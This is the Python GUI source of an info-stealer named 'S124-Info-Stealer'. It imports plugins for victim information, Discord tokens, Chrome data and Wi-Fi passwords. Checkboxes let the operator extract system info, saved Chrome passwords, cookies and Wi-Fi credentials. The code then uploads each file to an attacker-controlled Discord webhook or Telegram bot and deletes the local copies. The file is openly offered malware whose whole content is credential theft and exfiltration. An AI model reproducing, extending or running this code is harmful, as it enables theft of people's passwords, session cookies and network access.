import tkinter as tk
from tkinter import ttk, messagebox
import re
import requests
from env_manager import env_manager
from plugins.get_victim_information import *
from plugins.get_discord_tokens import *
from plugins.get_chrome_information import *
from plugins.get_wifi_passwords import *

# Initialize the main window
root = tk.Tk()
root.title("S124-Info-Stealer")
root.geometry("400x400")

# Create the notebook (tabbed interface)
notebook = ttk.Notebook(root)
tab_discord = ttk.Frame(notebook)
tab_telegram = ttk.Frame(notebook)
notebook.add(tab_discord, text='Send to Discord')
notebook.add(tab_telegram, text='Send to Telegram')
notebook.pack(expand=1, fill='both')

# Discord Tab
ttk.Label(tab_discord, text="Discord Webhook URL:").pack(pady=10)
discord_webhook_entry = ttk.Entry(tab_discord, width=50)
discord_webhook_entry.pack(pady=5)

# Telegram Tab
ttk.Label(tab_telegram, text="Telegram Bot Token:").pack(pady=10)
telegram_bot_token_entry = ttk.Entry(tab_telegram, width=50)
telegram_bot_token_entry.pack(pady=5)

ttk.Label(tab_telegram, text="Telegram Chat ID:").pack(pady=10)
telegram_chat_id_entry = ttk.Entry(tab_telegram, width=50)
telegram_chat_id_entry.pack(pady=5)

# Common Options
frame_options = ttk.LabelFrame(root, text="Options", padding=10)
frame_options.pack(pady=10, fill='x', padx=10)

system_info_var = tk.BooleanVar()
passwords_var = tk.BooleanVar()
cookies_var = tk.BooleanVar()
wifi_passwords_var = tk.BooleanVar()

ttk.Checkbutton(frame_options, text="Extract System Info", variable=system_info_var).pack(anchor='w')
ttk.Checkbutton(frame_options, text="Extract Passwords", variable=passwords_var).pack(anchor='w')
ttk.Checkbutton(frame_options, text="Extract Cookies", variable=cookies_var).pack(anchor='w')
ttk.Checkbutton(frame_options, text="Extract Wi-Fi Passwords", variable=wifi_passwords_var).pack(anchor='w')

# Status Label
status_label = ttk.Label(root, text="Status: Waiting", relief=tk.SUNKEN, anchor='w')
status_label.pack(fill='x', pady=5)

# Function to validate webhook and bot details
def validate_inputs():
    discord_webhook = discord_webhook_entry.get()
    telegram_bot_token = telegram_bot_token_entry.get()
    telegram_chat_id = telegram_chat_id_entry.get()

    if discord_webhook and not re.match(r'https://discord\.com/api/webhooks/\d+/.+', discord_webhook):
        messagebox.showerror("Invalid Input", "Invalid Discord Webhook URL.")
        return False

    if telegram_bot_token:
        try:
            response = requests.get(f'https://api.telegram.org/bot{telegram_bot_token}/getMe')
            if response.status_code != 200:
                raise ValueError
        except:
            messagebox.showerror("Invalid Input", "Invalid Telegram Bot Token.")
            return False

    if telegram_chat_id:
        if not telegram_chat_id.isdigit():
            messagebox.showerror("Invalid Input", "Telegram Chat ID should be numeric.")
            return False

    return True

# Function to set environment variables
def set_env_variables():
    discord_webhook = discord_webhook_entry.get()
    telegram_bot_token = telegram_bot_token_entry.get()
    telegram_chat_id = telegram_chat_id_entry.get()

    if discord_webhook:
        env_manager.set_env_variable('DISCORD_WEBHOOK_URL', discord_webhook)
    if telegram_bot_token:
        env_manager.set_env_variable('TELEGRAM_BOT_TOKEN', telegram_bot_token)
    if telegram_chat_id:
        env_manager.set_env_variable('TELEGRAM_CHAT_ID', telegram_chat_id)

# Function to run plugins based on selected options
def run_plugins():
    status_label.config(text="Status: Running...")
    root.update_idletasks()

    if not validate_inputs():
        status_label.config(text="Status: Error")
        return

    discord_webhook = discord_webhook_entry.get()
    telegram_bot_token = telegram_bot_token_entry.get()
    telegram_chat_id = telegram_chat_id_entry.get()

    if not discord_webhook and not (telegram_bot_token and telegram_chat_id):
        messagebox.showerror("Input Error", "Please provide either a Discord Webhook URL or Telegram Bot Token and Chat ID.")
        status_label.config(text="Status: Waiting")
        return

    if not (system_info_var.get() or passwords_var.get() or cookies_var.get() or wifi_passwords_var.get()):
        messagebox.showerror("Selection Error", "Please select at least one option to extract.")
        status_label.config(text="Status: Waiting")
        return

    set_env_variables()
    # Debug: Print environment variables
    print("Environment Variables after setting:")
    print("DISCORD_WEBHOOK_URL:", os.getenv('DISCORD_WEBHOOK_URL'))
    print("TELEGRAM_BOT_TOKEN:", os.getenv('TELEGRAM_BOT_TOKEN'))
    print("TELEGRAM_CHAT_ID:", os.getenv('TELEGRAM_CHAT_ID'))

    discord_webhook_url = env_manager.get_env_variable('DISCORD_WEBHOOK_URL')
    telegram_bot_token = env_manager.get_env_variable('TELEGRAM_BOT_TOKEN')
    telegram_chat_id = env_manager.get_env_variable('TELEGRAM_CHAT_ID')

    try:
        if system_info_var.get():
            info_file_path = get_computer_information()
            if info_file_path:
                if discord_webhook_url:
                    send_file_to_discord(info_file_path, discord_webhook_url,"Computer Information")
                if telegram_bot_token and telegram_chat_id:
                    send_file_to_telegram(info_file_path, telegram_bot_token, telegram_chat_id, "Computer Information")

        if passwords_var.get():
            password_file_path = extract_chrome_password()
            if password_file_path:
                if discord_webhook_url:
                    send_file_to_discord(password_file_path, discord_webhook_url, "Chrome Passwords")
                if telegram_bot_token and telegram_chat_id:
                    send_file_to_telegram(password_file_path,telegram_bot_token, telegram_chat_id, "Chrome Passwords")

        if cookies_var.get():
            cookies_file_path = extract_chrome_cookie()
            if cookies_file_path:
                if discord_webhook_url:
                    send_file_to_discord(cookies_file_path, discord_webhook_url, "Chrome Cookies")
                if telegram_bot_token and telegram_chat_id:
                    send_file_to_telegram(cookies_file_path, telegram_bot_token, telegram_chat_id, "Chrome Cookies")

        if wifi_passwords_var.get():
            wifi_passwords_file = wifi_profiles_and_passwords()
            if wifi_passwords_file:
                if discord_webhook_url:
                    send_file_to_discord(wifi_passwords_file, discord_webhook_url, "Wi-Fi Passwords")
                if telegram_bot_token and telegram_chat_id:
                    send_file_to_telegram(wifi_passwords_file, telegram_bot_token, telegram_chat_id, "Wi-Fi Passwords")
    except Exception as e:
        messagebox.showerror("Error", f"An error occurred: {e}")
        status_label.config(text="Status: Error")
        return

    delete_files()
    status_label.config(text="Status: Completed")
    messagebox.showinfo("Task Completed", "Extraction and sending completed.")

# Run Button
run_button = ttk.Button(root, text="Go", command=run_plugins)
run_button.pack(pady=20)

root.mainloop()
